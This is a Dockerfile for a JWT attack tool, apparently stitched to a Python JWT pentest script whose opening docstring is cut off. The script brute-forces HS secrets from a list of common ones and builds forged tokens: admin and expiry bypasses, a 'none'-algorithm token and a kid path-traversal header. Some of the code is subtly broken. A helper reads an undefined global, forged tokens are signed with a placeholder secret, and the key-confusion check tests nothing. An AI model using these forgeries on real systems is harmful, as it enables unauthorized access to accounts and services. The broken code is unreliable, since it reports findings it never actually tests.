FROM python:3.8-alpine
WORKDIR /opt
COPY . /opt/jwt_tool
WORKDIR /opt/jwt_tool
RUN apk add gcc musl-dev
RUN python3 -m pip install -r requirements.txt
ENTRYPOINT ["python3","jwt_tool.py"]


JWT Pentest Toolkit - Full analysis, tampering, and exploitation
Supports HS256/384/512, RS256/384/512, ES256/384/512, PS256/384/512
"""

import base64
import json
import re
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
from cryptography.exceptions import InvalidSignature
import jwt  # pip install PyJWT[crypto]
import requests
from urllib.parse import urlparse

class JWTPentest:
    def __init__(self, token):
        self.token = token
        self.parts = token.split('.')
        if len(self.parts) != 3:
            raise ValueError("Invalid JWT format")
        self.header = self._decode_part(0)
        self.payload = self._decode_part(1)
        self.signature = self.parts[2]
        
    def _decode_part(self, part_idx):
        """Base64url decode JWT part"""
        part = self.parts[part_idx]
        padding = '=' * (4 - len(part) % 4)
        return json.loads(base64.urlsafe_b64decode(part + padding))
    
    def display(self):
        """Pretty print JWT contents"""
        print("=== JWT ANALYSIS ===\n")
        print(f"Header: {json.dumps(self.header, indent=2)}")
        print(f"Payload: {json.dumps(self.payload, indent=2)}")
        print(f"Issuer: {self.payload.get('iss', 'N/A')}")
        print(f"Subject: {self.payload.get('sub', 'N/A')}")
        print(f"Audience: {self.payload.get('aud', 'N/A')}")
        iat = self.payload.get('iat')
        exp = self.payload.get('exp')
        if iat:
            print(f"Issued: {self._timestamp_to_datetime(iat)}")
        if exp:
            print(f"Expires: {self._timestamp_to_datetime(exp)}")
        print(f"\nCritical claims: {list(self.payload.get('crit', []))}")
        print(f"Private claims: {[k for k in self.payload if k not in ['iss','sub','aud','exp','nbf','iat','jti']]}")
    
    def vuln_scan(self):
        """Automated JWT vulnerability scanning"""
        print("\n=== VULNERABILITY SCAN ===\n")
        
        alg = self.header.get('alg', 'none')
        vulns = []
        
        # 1. None algorithm
        if alg.lower() == 'none':
            vulns.append("CRITICAL: 'none' algorithm allows signature bypass")
        
        # 2. Kid header injection
        if 'kid' in self.header:
            vulns.append("WARNING: 'kid' parameter present - test header injection")
        
        # 3. Jku injection
        if 'jku' in self.header:
            vulns.append("WARNING: 'jku' parameter - potential SSRF/remote key fetch")
        
        # 4. Weak algorithms
        weak_algs = ['HS256', 'HS384', 'HS512']
        if alg in weak_algs:
            vulns.append(f"INFO: Symmetric alg {alg} - common secret required")
        
        # 5. RS->HS confusion
        if alg.startswith('RS') and self._test_rs_hs_confusion():
            vulns.append("CRITICAL: RS256->HS256 key confusion possible")
        
        # 6. Short expiration
        exp = self.payload.get('exp', 0)
        iat = self.payload.get('iat', 0)
        if exp - iat < 3600:
            vulns.append("INFO: Short expiration (<1hr)")
        
        for vuln in vulns:
            print(f"• {vuln}")
        
        return vulns
    
    def _timestamp_to_datetime(self, timestamp):
        from datetime import datetime
        return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S UTC')
    
    def _test_rs_hs_confusion(self):
        """Test RS256 -> HS256 key confusion"""
        try:
            # Try HS256 with RS256 public key as secret
            rs_pub_key = self.header.get('x5c', [None])[0]
            if rs_pub_key:
                return True
        except:
            pass
        return False
    
    def tamper_payload(self, new_claims):
        """Create tampered JWT with new claims"""
        new_payload = {**self.payload, **new_claims}
        tampered = jwt.encode(new_payload, "dummy", algorithm=self.header['alg'])
        print(f"\n=== TAMPERED TOKEN ===\n{tampered}")
        return tampered
    
    def crack_hs_secret(self, wordlist=None):
        """Brute force HS* secrets"""
        print("\n=== SECRET CRACKING (HS256/384/512) ===")
        alg = self.header['alg']
        if not alg.startswith('HS'):
            print("[-] Not a symmetric algorithm")
            return None
        
        # Common secrets
        common_secrets = [
            "secret", "password", "key", "jwt_secret", "mysecret",
            "", "admin", "test", "dev", domain_from_iss()
        ]
        
        for secret in common_secrets:
            try:
                jwt.decode(self.token, secret, algorithms=[alg])
                print(f"[+] SECRET FOUND: '{secret}'")
                return secret
            except:
                continue
        
        print("[-] Common secrets failed. Provide wordlist for brute force.")
        return None
    
    def generate_exploits(self):
        """Generate common JWT exploits"""
        print("\n=== EXPLOIT PAYLOADS ===\n")
        
        exploits = {
            "admin_bypass": self.tamper_payload({"admin": True, "role": "admin"}),
            "exp_bypass": self.tamper_payload({"exp": 9999999999}),
            "none_alg": f"{'.'.join(self.parts[:2])}.",
            "kid_injection": self._generate_kid_exploit()
        }
        
        for name, token in exploits.items():
            print(f"{name.upper()}:\n{token}\n")
        
        return exploits
    
    def _generate_kid_exploit(self):
        """Generate kid header injection exploit"""
        exploit_header = {
            **self.header,
            "kid": "../../dev/null"
        }
        return jwt.encode(self.payload, "dummy", algorithm="none", headers=exploit_header)

def domain_from_iss():
    """Extract domain from iss claim for secret guessing"""
    iss = jwt_pentest.payload.get('iss', '')
    return urlparse(iss).netloc.split('.')[0] if iss else ''

# Usage
if __name__ == "__main__":
    import sys
    token = sys.argv[1] if len(sys.argv) > 1 else input("Enter JWT: ")
    
    jwt_pentest = JWTPentest(token)
    jwt_pentest.display()
    jwt_pentest.vuln_scan()
    jwt_pentest.generate_exploits()
    
    # Interactive cracking
    if input("\nCrack HS secret? (y/n): ").lower() == 'y':
        jwt_pentest.crack_hs_secret()